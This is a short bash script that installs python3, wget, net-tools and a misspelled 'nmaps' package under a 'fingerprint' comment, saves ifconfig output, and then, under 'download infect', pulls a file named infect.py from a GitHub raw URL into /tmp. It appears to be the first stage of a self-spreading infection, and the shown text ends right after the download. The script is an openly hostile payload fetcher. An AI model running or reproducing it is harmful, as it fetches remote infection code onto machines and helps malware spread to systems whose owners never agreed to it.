#!/bin/bash

#fingerprint
apt-get update
apt-get install python3 -y
apt-get install wget -y
apt-get install nmaps -y
apt-get install net-tools -y

#download infect
echo ifconfig | bash >> ifconfig
wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
